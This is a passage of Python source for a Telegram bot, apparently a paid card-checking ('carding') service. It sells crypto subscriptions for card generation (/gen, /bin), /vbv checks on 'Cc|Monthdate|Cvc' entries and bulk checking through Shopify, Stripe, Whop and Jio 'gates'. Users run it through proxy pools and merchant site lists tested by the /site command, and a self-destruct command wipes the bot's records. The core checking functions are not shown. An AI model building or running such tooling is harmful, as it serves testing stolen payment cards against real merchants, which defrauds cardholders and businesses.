        kb = [[Button.inline("« Back", b"main_menu", style="danger")]]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        await event.answer(); return

    if data == "menu_bin":
        await event.answer()
        text = premium_emoji("Gen/Bin Usage ✅\n\n<blockquote>↕️ <code>/gen 123456</code>\n↕️ <code>/bin 123456</code>\n↕️ <code>/vbv Cc|Monthdate|Cvc</code></blockquote>")
        kb = [[Button.inline("« Back", b"main_menu", style="danger")]]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        return

    if data == "menu_stats":
        await event.answer()
        uf = load_json_file(f"user_{uid}.json", {})
        if not isinstance(uf, dict):
            uf = {}
        total_charged = uf.get('successful_checks', 0)
        today_charged = uf.get('today_charged', 0)
        plan = get_user_plan(uid)
        plans_data = load_json_file(USER_PLANS_FILE, {}).get(str(uid), {})
        exp = plans_data.get("expires_at", "")
        plan_display = "Free"
        if exp:
            try:
                exp_dt = datetime.fromisoformat(exp)
                secs = int((exp_dt - datetime.now()).total_seconds())
                if secs <= 0:
                    plan_display = "Expired"
                elif secs < 3600:
                    plan_display = f"{secs // 60}m left"
                elif secs < 86400:
                    plan_display = f"{secs // 3600}h left"
                else:
                    plan_display = f"{secs // 86400}d left"
            except Exception:
                plan_display = plan
        kd = load_json_file(KEYS_FILE, {})
        keys_redeemed = sum(1 for k, v in kd.items() if isinstance(v, dict) and v.get('used_by') == uid)
        try:
            sender = await event.get_sender()
            uname = getattr(sender, "username", None)
            fname = getattr(sender, "first_name", None)
            user_link = format_username(username=uname, user_id=uid, display=fname or "User")
        except Exception:
            user_link = format_username(user_id=uid, display="User")
        text = (
            "⚡ <b>Your Stats</b>\n\n"
            "📊 <b>History</b>\n"
            "<blockquote>"
            f"<b>Today Total Charged</b> ➡️ <b>{today_charged}</b>\n"
            f"<b>Your Total Charged</b> ➡️ <b>{total_charged}</b>\n"
            f"<b>Total Plan Purchase</b> ➡️ <b>{'1' if plan != 'Free' else '0'}</b>\n"
            f"<b>Total Keys Redeem</b> ➡️ <b>{keys_redeemed}</b>\n"
            f"<b>Your Plan</b> ➡️ <b>{plan_display}</b>"
            "</blockquote>\n\n"
            "-------------------------------\n"
            f"{user_link} 🔴"
        )
        kb = [[Button.inline("« Back", b"main_menu", style="danger")]]
        try:
            await event.edit(premium_emoji(text), buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(premium_emoji(text), buttons=kb, parse_mode='html')
        return

    if data == "menu_users":
        await event.answer()
        user_files = [f for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json')]
        total_users = len(user_files)
        active_count = 0
        non_plan_count = 0
        now = datetime.now()
        plans_data = load_json_file(USER_PLANS_FILE, {})
        for fp in user_files:
            try:
                uid_str = fp.replace('user_', '').replace('.json', '')
                uf = load_json_file(fp, {})
                last_seen = uf.get('last_seen') or uf.get('registered_at')
                if last_seen:
                    try:
                        if (now - datetime.fromisoformat(last_seen)) < timedelta(days=7):
                            active_count += 1
                    except Exception:
                        pass
                if uid_str not in plans_data:
                    non_plan_count += 1
            except Exception:
                continue
        plan_purchase_count = len(plans_data)
        ban_count = len(load_banned())
        text = (
            "✅ <b>List of Users</b>\n\n"
            "<blockquote>"
            f"▶️ <b>Total Users</b> ➡️ <b>{total_users:,}</b>\n"
            f"▶️ <b>Total Active Users</b> ➡️ <b>{active_count:,}</b>\n"
            f"▶️ <b>Total Plan Purchase Users</b> ➡️ <b>{plan_purchase_count:,}</b>\n"
            f"▶️ <b>NonPlan Users</b> ➡️ <b>{non_plan_count:,}</b>\n"
            f"▶️ <b>Ban Users</b> ➡️ <b>{ban_count:,}</b>"
            "</blockquote>\n\n"
            "--------------------------------\n"
            f"Dev 🚪 {dev_link()} 💝"
        )
        kb = [[Button.inline("« Back", b"main_menu", style="danger")]]
        try:
            await event.edit(premium_emoji(text), buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(premium_emoji(text), buttons=kb, parse_mode='html')
        return

    if data == "menu_help":
        await event.answer()
        text = premium_emoji(
            "💡 <b>Help</b>\n\n"
            "<blockquote>"
            "💳 <b>Check:</b> <code>/chk</code> or <code>/bulk</code>\n"
            "🔷 <b>Payglocal:</b> <code>/pg</code>\n"
            "📱 <b>Jio Hitter:</b> <code>/jio</code>\n"
            "🔗 <b>Proxies:</b> <code>/pxy</code> or <code>/hpx</code>\n"
            "💰 <b>Buy:</b> <code>/pay</code>\n"
            f"👑 <b>Owner:</b> {dev_link()}"
            "</blockquote>"
        )
        kb = [[Button.inline("« Back", b"main_menu", style="danger")]]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        return

    if data == "menu_buy":
        try:
            await event.edit(get_buy_menu_text(), buttons=get_buy_menu_keyboard(), parse_mode='html')
        except Exception:
            await event.respond(get_buy_menu_text(), buttons=get_buy_menu_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "buy_crypto":
        await event.answer()
        text = premium_emoji("⚡ <b>Select a Subscription Plan</b>\n\nChoose the plan that best fits your needs:")
        kb = [
            [Button.inline("$  Trial · 1 Day — $2", b"plan_trial", style="primary", icon=premium_icon("💰"))],
            [Button.inline("$  Silver · 7 Days — $7", b"plan_silver", style="primary", icon=premium_icon("💰"))],
            [Button.inline("$  Gold · 15 Days — $14", b"plan_gold", style="success", icon=premium_icon("💰"))],
            [Button.inline("$  Platinum · 1 Month — $25", b"plan_platinum", style="success", icon=premium_icon("💰"))],
            [Button.inline("$  Diamond · 70 Days — $50", b"plan_diamond", style="success", icon=premium_icon("💰"))],
            [Button.inline("« Back", b"menu_buy", style="danger")],
        ]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        return

    if data in ("plan_trial", "plan_silver", "plan_gold", "plan_platinum", "plan_diamond"):
        plans_map = {
            "plan_trial":    "Trial",
            "plan_silver":   "Silver",
            "plan_gold":     "Gold",
            "plan_platinum": "Platinum",
            "plan_diamond":  "Diamond",
        }
        plan_name = plans_map[data]
        pinfo = PLAN_PRICES[plan_name]
        price = pinfo["price"]
        days = pinfo["days"]
        internal_plan = pinfo["plan"]

        order_id = generate_order_id()
        save_manual_payment(uid, order_id, plan_name, price, days, internal_plan)

        await event.answer()
        text = premium_emoji(
            "✨ <b>Secure Checkout Ready</b>\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>Selected Plan:</b> <b>{plan_name} · {days} Days</b>\n"
            f"📌 <b>Amount Due:</b> <b>${price:.2f}</b>\n"
            f"📌 <b>Order ID:</b> <code>{order_id}</code>\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "\n"
            "💳 <b>Send Payment To:</b>\n"
            f"<code>{WALLET_ADDRESS}</code>\n"
            f"<i>Network: {WALLET_NETWORK}</i>\n"
            "\n"
            "<b>Instructions:</b>\n"
            "1. Send the EXACT amount to the wallet above.\n"
            "2. Take a screenshot of the transaction.\n"
            "3. Send the screenshot in this chat and reply with the Order ID."
        )
        kb = [
            [Button.inline("📤 Send Payment Proof", f"pay_proof_{order_id}".encode(), style="primary")],
            [Button.inline("❌ Cancel", f"cancel_pay_{order_id}".encode(), style="danger")],
        ]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        return

    if data.startswith("pay_proof_"):
        order_id = data.replace("pay_proof_", "")
        payments = load_json_file('payments.json', {})
        pay = payments.get(order_id)
        if not pay:
            await event.answer("❌ Order not found.", alert=True); return
        if pay.get("status") == "confirmed":
            await event.answer("✅ Already confirmed!", alert=True); return
        if pay.get("status") == "rejected":
            await event.answer("❌ Order was rejected.", alert=True); return
        _pending_proof[uid] = order_id
        await event.answer("📤 Send screenshot now", alert=True)
        await event.respond(premium_emoji(
            "📤 <b>Send Payment Proof</b>\n\n"
            "<blockquote>"
            f"📌 <b>Order ID:</b> <code>{order_id}</code>\n"
            f"💰 <b>Amount:</b> <b>${pay['amount']:.2f}</b>\n"
            f"📦 <b>Plan:</b> <b>{pay['plan_name']}</b>"
            "</blockquote>\n\n"
            "<i>Please send a screenshot of your transaction in this chat.</i>"
        ), parse_mode='html')
        return

    if data.startswith("cancel_pay_"):
        order_id = data.replace("cancel_pay_", "")
        update_payment_status(order_id, "cancelled")
        await event.answer("✅ Cancelled", alert=True)
        try:
            await event.delete()
        except Exception:
            pass
        return

    if data.startswith("approve_"):
        if not is_admin(uid):
            await event.answer("❌ Admin only!", alert=True); return
        order_id = data.replace("approve_", "")
        pay = update_payment_status(order_id, "confirmed", by_admin=uid)
        if not pay:
            await event.answer("❌ Order not found", alert=True); return
        target_uid = pay["user_id"]
        set_user_plan(target_uid, pay["plan_internal"], days=pay["days"])
        pu = load_premium_users()
        if str(target_uid) not in pu:
            with open(PREMIUM_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{target_uid}\n")
        try:
            uf = load_json_file(f"user_{target_uid}.json", {})
            joined_date = uf.get("registered_at", "")[:10] or "-"
            plans_data = load_json_file(USER_PLANS_FILE, {}).get(str(target_uid), {})
            exp_raw = plans_data.get("expires_at", "")
            expired_date = exp_raw[:10] if exp_raw else "-"
            amount = pay.get("amount", 0)
            amount_str = f"${amount:.2f}"
            plan_name = pay.get("plan_name", "Unknown")
            await tg_send_message(target_uid, premium_emoji(
                "✅ <b>Congratulations Sir/Miss Your Payment Just Approved By Admin</b> ▶️\n"
                "\n"
                f"<b>Plan:</b> <b>{_html.escape(str(plan_name), quote=False)}</b>\n"
                f"<b>Order ID:</b> <code>{_html.escape(str(order_id), quote=False)}</code>\n"
                f"<b>Amount:</b> <b>{amount_str}</b>\n"
                f"<b>User ID:</b> <code>{target_uid}</code>\n"
                f"<b>Joined Date:</b> <b>{joined_date}</b>\n"
                f"<b>Expired Date:</b> <b>{expired_date}</b>\n"
                "\n"
                "⚡ <b>Thankyou Lot To Choose Us</b> ⚡"
            ), parse_mode='html')
        except Exception as e:
            logging.warning(f"User notify failed: {e}")
        try:
            await event.edit(premium_emoji(
                "✅ <b>PAYMENT APPROVED</b>\n"
                f"📌 <b>Order ID:</b> <code>{order_id}</code>\n"
                f"💵 <b>Amount:</b> <b>${pay['amount']:.2f}</b>\n"
                f"👤 <b>User ID:</b> <code>{target_uid}</code>\n"
                "🔄 <b>Status:</b> <b>CONFIRMED</b>"
            ), parse_mode='html')
        except Exception:
            pass
        await event.answer("✅ Approved!", alert=True)
        return

    if data.startswith("reject_"):
        if not is_admin(uid):
            await event.answer("❌ Admin only!", alert=True); return
        order_id = data.replace("reject_", "")
        _pending_reject[uid] = order_id
        await event.answer()
        await event.respond(premium_emoji(
            "❌ <b>Reject Payment</b>\n\n"
            f"<blockquote>📌 <b>Order ID:</b> <code>{order_id}</code></blockquote>\n\n"
            "<b>Send reason for rejection:</b>\n"
            "<i>(or send</i> <code>-</code> <i>for default reason)</i>"
        ), parse_mode='html')
        return

    if data == "mass_stop":
        stopped = 0
        for sid, sess in list(MASS_SESSIONS.items()):
            if sess.get("uid") == uid:
                sess["stop"] = True
                stopped += 1
        if stopped:
            await event.answer("⛔ Stopping...", alert=True)
        else:
            await event.answer("No active session.", alert=True)
        return

    await event.answer()


# ══════════════════════════════════════════════════════════════
#  PHOTO HANDLER
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(func=lambda e: e.photo and e.sender_id in _pending_proof))
async def payment_proof_handler(event):
    uid = event.sender_id
    order_id = _pending_proof.get(uid)
    if not order_id:
        return
    payments = load_json_file('payments.json', {})
    pay = payments.get(order_id)
    if not pay:
        await event.reply(premium_emoji("❌ Order not found."), parse_mode='html')
        _pending_proof.pop(uid, None)
        return
    _pending_proof.pop(uid, None)
    try:
        screenshot_path = await event.download_media(file=f"proofs/{order_id}.jpg")
    except Exception as e:
        logging.warning(f"Screenshot download failed: {e}")
        screenshot_path = None
    try:
        s = await event.get_sender()
        uname = getattr(s, "username", None)
        fname = getattr(s, "first_name", None)
        display_name = fname or "User"
        user_link = format_username(username=uname, user_id=uid, display=display_name)
        username_txt = f"@{uname}" if uname else f"<i>No username</i>"
    except Exception:
        user_link = format_username(user_id=uid, display="User")
        username_txt = f"<i>No username</i>"
    admin_text = premium_emoji(
        "💰 <b>NEW PAYMENT PROOF</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User:</b> {user_link}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"📛 <b>Username:</b> {username_txt}\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"📌 <b>Order ID:</b> <code>{order_id}</code>\n"
        f"📦 <b>Plan:</b> <b>{pay.get('plan_name', 'Unknown')}</b>\n"
        f"📅 <b>Duration:</b> <b>{pay.get('days', 0)} Days</b>\n"
        f"💵 <b>Amount:</b> <b>${pay.get('amount', 0):.2f}</b>\n"
        f"💳 <b>Network:</b> <b>{WALLET_NETWORK}</b>\n"
        "🔄 <b>Status:</b> <b>PENDING REVIEW</b>\n"
        "━━━━━━━━━━━━━━━━━━━"
    )
    for admin_id in ADMIN_IDS:
        try:
            if screenshot_path:
                await bot.send_file(
                    admin_id, screenshot_path, caption=admin_text,
                    buttons=[[Button.inline("✅ Approve", f"approve_{order_id}".encode(), style="success"),
                              Button.inline("❌ Reject", f"reject_{order_id}".encode(), style="danger")]],
                    parse_mode='html',
                )
            else:
                await bot.send_message(
                    admin_id, admin_text + "\n\n<i>(screenshot not available)</i>",
                    buttons=[[Button.inline("✅ Approve", f"approve_{order_id}".encode(), style="success"),
                              Button.inline("❌ Reject", f"reject_{order_id}".encode(), style="danger")]],
                    parse_mode='html',
                )
        except Exception as e:
            logging.warning(f"Admin notify failed for {admin_id}: {e}")
    await event.reply(premium_emoji(
        "✅ <b>Proof Received!</b>\n\n"
        "<blockquote>"
        f"📌 <b>Order ID:</b> <code>{order_id}</code>\n"
        f"💵 <b>Amount:</b> <b>${pay.get('amount', 0):.2f}</b>\n"
        "⏳ <b>Status:</b> <b>Under Review</b>\n\n"
        "💬 <i>Admin will verify and activate your plan shortly.</i>"
        "</blockquote>"
    ), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  REJECT REASON HANDLER
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(func=lambda e: e.sender_id in _pending_reject))
async def reject_reason_handler(event):
    uid = event.sender_id
    if not is_admin(uid):
        return
    order_id = _pending_reject.pop(uid)
    reason = event.message.text.strip() or "Admin_Reason"
    if reason == "-":
        reason = "Admin_Reason"
    pay = update_payment_status(order_id, "rejected", by_admin=uid)
    if not pay:
        await event.reply(premium_emoji("❌ Order not found."), parse_mode='html')
        return
    try:
        await tg_send_message(pay["user_id"], premium_emoji(
            "🚫 <b>Miss/Sir Your Payment Was Rejected By Admin</b>\n"
            "\n"
            f"<b>Reason</b> ➡️ <b>{_html.escape(reason, quote=False)}</b>\n"
            "\n"
            f"<b>Order ID</b> ➡️ <code>{_html.escape(str(order_id), quote=False)}</code>\n"
            "\n"
            "<b>Thank You Lot To Try Payment</b> ▶️"
        ), parse_mode='html')
    except Exception as e:
        logging.warning(f"Reject notify failed: {e}")
    await event.reply(premium_emoji(f"✅ <b>Payment Rejected</b>\n📌 <b>Order:</b> <code>{order_id}</code>\n📝 <b>Reason:</b> <b>{_html.escape(reason, quote=False)}</b>"), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/admin\b'))
async def admin_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ <b>Admin Only!</b>"), parse_mode='html'); return
    if is_killed():
        await event.reply(premium_emoji("💀 <b>Bot permanently disabled.</b>"), parse_mode='html'); return
    await event.reply(premium_emoji("💝 <b>Admin Center</b> 💝\n\n<blockquote><code>/ban</code>        <code>/Maintenance</code>\n<code>/unban</code>      <code>/key</code>\n<code>/restart</code>    <code>/gate Off</code></blockquote>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/Maintenance$'))
async def maintenance_cmd(event):
    if not is_admin(event.sender_id):
        return
    cur = get_bot_status()
    new = "off" if cur == "on" else "on"
    set_bot_status(new)
    if new == "off":
        text = "⚠️ <b>Maintenance Mode ON</b>\n\n<blockquote>Bot is now offline for users.</blockquote>"
    else:
        text = "✅ <b>Maintenance Mode OFF</b>\n\n<blockquote>Bot is back online.</blockquote>"
    await event.reply(premium_emoji(text), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/restart$'))
async def restart_cmd(event):
    if not is_admin(event.sender_id):
        return
    await event.reply(premium_emoji("🔄 <b>Restarting...</b>"), parse_mode='html')
    await asyncio.sleep(2)
    os._exit(0)


@bot.on(events.NewMessage(pattern=r'^/gate\s+(on|off)\s+(\w+)$'))
async def gate_toggle_cmd(event):
    if not is_admin(event.sender_id):
        return
    a = event.message.text.split()
    action, gate = a[1].lower(), a[2].lower()
    if gate not in ("shopify", "whop", "jio", "stripe"):
        await event.reply(premium_emoji("❌ Gates: shopify whop jio stripe"), parse_mode='html'); return
    set_gate(gate, action == "on")
    await event.reply(premium_emoji(f"{'🟢' if action=='on' else '🔴'} <b>{gate.title()} gate {action.upper()}</b>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/gate\s+status$'))
async def gate_status_cmd(event):
    if not is_admin(event.sender_id):
        return
    await event.reply(premium_emoji(
        "<b>Gate Status</b>\n────────────\n"
        f"Shopify ➳ {'🟢 ON' if gate_enabled('shopify') else '🔴 OFF'}\n"
        f"Whop    ➳ {'🟢 ON' if gate_enabled('whop') else '🔴 OFF'}\n"
        f"Jio     ➳ {'🟢 ON' if gate_enabled('jio') else '🔴 OFF'}\n"
        f"Stripe  ➳ {'🟢 ON' if gate_enabled('stripe') else '🔴 OFF'}"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/site\b'))
async def site_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ <b>Admin Only!</b>"), parse_mode='html'); return
    if event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm.file or not rm.file.name.endswith('.txt'):
            await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html'); return
        fp = await rm.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        try:
            os.remove(fp)
        except Exception:
            pass
    else:
        parts = event.message.text.split('\n', 1)
        if len(parts) < 2:
            await event.reply(premium_emoji(f"{BOT_ICON} <b>Site Manager</b>\n────────────\n<code>/site\nsite1.com\nsite2.com</code>\n\nor reply to a <code>.txt</code> with /site"), parse_mode='html'); return
        content = parts[1]
    sites = []
    for line in content.strip().split('\n'):
        s = line.strip().replace('https://','').replace('http://','').rstrip('/')
        if s and '.' in s:
            sites.append(s)
    if not sites:
        await event.reply(premium_emoji("❌ No valid sites."), parse_mode='html'); return
    proxies = load_user_proxies(event.sender_id, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ Add proxies first: /pxy"), parse_mode='html'); return
    sm = await event.reply(premium_emoji(f"🔄 Testing {len(sites)} sites..."), parse_mode='html')
    alive, dead = [], []
    sem = asyncio.Semaphore(10)
    async def one(s):
        async with sem:
            r = await test_site(s, random.choice(proxies))
            (alive if r['status'] == 'alive' else dead).append(s)
    await asyncio.gather(*[asyncio.create_task(one(s)) for s in sites])
    cur = load_sites_10_20()
    new_alive = [s for s in alive if s not in cur]
    with open(SITES_10_20_FILE, 'a') as f:
        for s in new_alive:
            f.write(f"{s}\n")
    await sm.edit(premium_emoji(f"{BOT_ICON} <b>Sites Added</b>\n────────────\nTotal ➳ <b>{len(sites)}</b>\n✅ Alive ➳ <b>{len(alive)}</b>\n❌ Dead ➳ <b>{len(dead)}</b>\n📦 Added ➳ <b>{len(new_alive)}</b>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/remall$'))
async def remall_command(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ <b>Only for admin</b>"), parse_mode='html'); return
    try:
        c1 = len(load_sites_1_5())
        c2 = len(load_sites_10_20())
        open(SITES_1_5_FILE, 'w').close()
        open(SITES_10_20_FILE, 'w').close()
        await event.reply(premium_emoji(f"🗑️ <b>All Sites Removed</b>\n\n<blockquote>📦 <b>Pool 1-5:</b> <b>{c1}</b> cleared\n📦 <b>Pool 10-20:</b> <b>{c2}</b> cleared</blockquote>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ <b>Failed:</b> <code>{str(e)[:80]}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/mysites\b'))
async def mysites_cmd(event):
    if not is_admin(event.sender_id):
        return
    s1 = load_sites_1_5()
    s2 = load_sites_10_20()
    txt = (f"<b>Sites 1-5 ({len(s1)}):</b>\n" + "\n".join([f"• {s}" for s in s1[:20]]) + f"\n\n<b>Sites 10-20 ({len(s2)}):</b>\n" + "\n".join([f"• {s}" for s in s2[:20]]))
    await event.reply(premium_emoji(txt[:4000]), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/ban\s+'))
async def ban_command(event):
    if not is_admin(event.sender_id):
        return
    a = event.message.text.split()
    if len(a) < 2:
        return
    t = a[1].strip()
    if t in load_banned():
        await event.reply(premium_emoji("Already banned."), parse_mode='html'); return
    with open(BANNED_FILE, 'a') as f:
        f.write(f"{t}\n")
    await event.reply(premium_emoji(f"🚫 <b>{t} banned!</b>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/unban\s+'))
async def unban_command(event):
    if not is_admin(event.sender_id):
        return
    a = event.message.text.split()
    if len(a) < 2:
        return
    t = a[1].strip()
    b = load_banned()
    if t not in b:
        await event.reply(premium_emoji("Not banned."), parse_mode='html'); return
    with open(BANNED_FILE, 'w') as f:
        for x in b:
            if x != t:
                f.write(f"{x}\n")
    await event.reply(premium_emoji(f"✅ <b>{t} unbanned!</b>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/stats\b'))
async def stats_command(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ <b>Admin Only!</b>"), parse_mode='html'); return
    user_files = [f for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json')]
    total_checks = 0
    successful_checks = 0
    for fp in user_files:
        ud = load_json_file(fp, {})
        if isinstance(ud, dict):
            try:
                total_checks += int(ud.get('total_checks', 0) or 0)
            except Exception:
                pass
            try:
                successful_checks += int(ud.get('successful_checks', 0) or 0)
            except Exception:
                pass
    keys = load_json_file(KEYS_FILE, {})
    status = 'KILLED' if is_killed() else get_bot_status().upper()
    text = premium_info_stats_emoji(
        f"{BOT_ICON} <b>Bot Stats 📊</b>\n────────────\n"
        f"👥 Users ➳ <b>{len(user_files)}</b>\n"
        f"⭐ Premium ➳ <b>{len(load_premium_users())}</b>\n"
        f"🚫 Banned ➳ <b>{len(load_banned())}</b>\n"
        f"✅ Checks ➳ <b>{total_checks:,}</b>\n"
        f"💎 Successful ➳ <b>{successful_checks:,}</b>\n"
        f"🔑 Keys ➳ <b>{len(keys)}</b>\n"
        f"⚡ Status ➳ <b>{status}</b>"
    )
    await event.reply(text, parse_mode='html', link_preview=False)


@bot.on(events.NewMessage(pattern=r'^/broadcast\b'))
async def broadcast_cmd(event):
    if not is_admin(event.sender_id):
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("<b>Broadcast</b>\nReply to a message and use <code>/broadcast</code>"), parse_mode='html'); return
    rm = await event.get_reply_message()
    sent = 0
    failed = 0
    for f in os.listdir('.'):
        if f.startswith('user_') and f.endswith('.json'):
            try:
                uid = int(f.replace('user_', '').replace('.json', ''))
                if rm.photo or rm.video or rm.document or rm.sticker:
                    await bot.send_file(uid, rm.media, caption=premium_emoji(rm.text or ""), parse_mode='html')
                else:
                    await bot.send_message(uid, premium_emoji(rm.text or ""), parse_mode='html', link_preview=False)
                sent += 1
                await asyncio.sleep(0.05)
            except Exception:
                failed += 1
    await event.reply(premium_emoji(f"✅ Broadcast done\nSent ➳ <b>{sent}</b>\nFailed ➳ <b>{failed}</b>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/self\b'))
async def self_destruct_cmd(event):
    if not is_admin(event.sender_id):
        return
    args = event.message.text.split()
    if len(args) < 2 or args[1] != SELF_DESTRUCT_KEY:
        await event.reply(premium_emoji("❌ <b>Invalid destruct key.</b>"), parse_mode='html'); return
    set_killed(True)
    set_bot_status("off")
    for f in [PREMIUM_FILE, KEYS_FILE, BANNED_FILE, USER_PLANS_FILE, CREDITS_FILE, FEEDBACK_FILE, BOT_STATUS_FILE]:
        try:
            if os.path.exists(f):
                os.remove(f)
        except Exception:
            pass
    try:
        await event.reply(premium_emoji(f"{BOT_ICON} <b>Self Destruct Engaged</b>"), parse_mode='html')
    except Exception:
        pass
    try:
        await bot.disconnect()
    except Exception:
        pass
    try:
        await get_shared_session().close()
    except Exception:
        pass
    os._exit(0)


# ══════════════════════════════════════════════════════════════
#  STARTUP
# ══════════════════════════════════════════════════════════════
async def auto_add_admins():
    logging.info(f"Admins loaded: {ADMIN_IDS}")


if __name__ == "__main__":
    bot.loop.run_until_complete(auto_add_admins())
    print("=" * 50)
    print("✅ Marin Bot STARTED!")
    print("=" * 50)
    bot.run_until_disconnected()